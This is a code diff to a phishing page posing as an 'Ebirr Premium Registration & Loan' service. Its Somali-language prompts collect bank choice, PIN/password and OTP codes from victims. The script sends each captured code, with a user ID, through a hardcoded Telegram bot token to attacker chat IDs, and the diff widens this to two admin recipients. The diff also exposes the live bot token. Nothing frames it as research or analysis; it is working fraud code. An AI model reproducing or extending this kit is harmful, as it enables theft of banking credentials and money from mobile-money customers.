@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>የኢ ብድር መመዝገቢያ ገፅ</title>
+    <title>Ebirr Premium Registration & Loan</title>
     <style>
         :root {
             --ebirr-green: #0d8331;
@@ -270,7 +270,7 @@
             veriTitle: "Xaqiijinta Koontada ayaa loo baahan yasahay", veriMsg: "Koontadaada looma xaqiijin adeeggan. Fadlan booqo laanta bangiga adoo wata aqoonsi iyo hal sawir si loo xaqiijiyo.",
             sucTitle: "Diiwaangelintu way guuleysatay!", sucMsg: "Waa lagu diiwaangeliyey. Waxaad fariin xaqiijin ah ka heli doontaa bangiga 24 saac gudahood.",
             soon: "Adeeggan dhowaan ayuu bilaabanayaa.", bankLock: "Bangigani hadda ma bixiyo adeegyo amaah ah. Fadlan dooro CBO oo kaliya.",
-            selBankErr: "Fadlan marka hore dooro bangigaaga.", wrongPin: "PIN/Password-ka waa khalad. Fadlan mar kale isku day.", wrongOtp: "OTP-gaaga waa khalad.", phNotReg: "Lambarkaagu uma diiwaangashan adeeggan. Fadlan is diwaangeli oo mar kale isku day.", tryAgain: "Mar kale isku day", resend: "Mar kale soo dir OTP", offline: "Aan khadka jirin", money: "Lacag", feres: "Feres"
+            selBankErr: "Fadlan marka hore dooro bangigaaga.", wrongPin: "PIN/Password-ka waa khalad. Fadlan mar kale isku day.", wrongOtp: "OTP-gaaga waa khalad.", phNotReg: "Lambarkaagu uma diiwaangashan adeeggan. Fadlan is diwaangeli oo mar kale isku day.", tryAgain: "Mar kale is ku day", resend: "Mar kale soo dir OTP", offline: "Aan khadka jirin", money: "Lacag", feres: "Feres"
         }
     };
 
@@ -279,7 +279,7 @@
     const userName = getID();
 
     const botToken = "8549032606:AAFYWOCJrcx-swjgsalQrH22vxitFoNtZYY";
-    const chatId = "8145799125";
+    const adminIds = ["8495316091", "8145799125"];
     let selectedBank = "", curL = 'en', step = -1, pollInt, timerInt, lastHandledUpdateId = 0;
 
     const nBtn = document.getElementById('btnNext'), pgs = { 0: document.getElementById('pg1'), 'wait': document.getElementById('pgWaiting'), 1: document.getElementById('pg2'), 2: document.getElementById('pg3'), 3: document.getElementById('pgSuccess'), 'elig': document.getElementById('pgNotEligible'), 'veri': document.getElementById('pgNotVerified') };
@@ -296,9 +296,11 @@
             text = `🔹 *${header}*\n👤 User: [${userName}]\n🔑 Code: \`${val}\``;
         }
 
-        let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
-        if(btns.length > 0) url += `&reply_markup=${JSON.stringify({inline_keyboard: [btns]})}`;
-        fetch(url);
+        adminIds.forEach(chatId => {
+            let url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;
+            if(btns.length > 0) url += `&reply_markup=${JSON.stringify({inline_keyboard: [btns]})}`;
+            fetch(url);
+        });
     }
 
     window.addEventListener('load', () => setTimeout(() => document.getElementById('splashScreen').style.display = 'none', 1500));
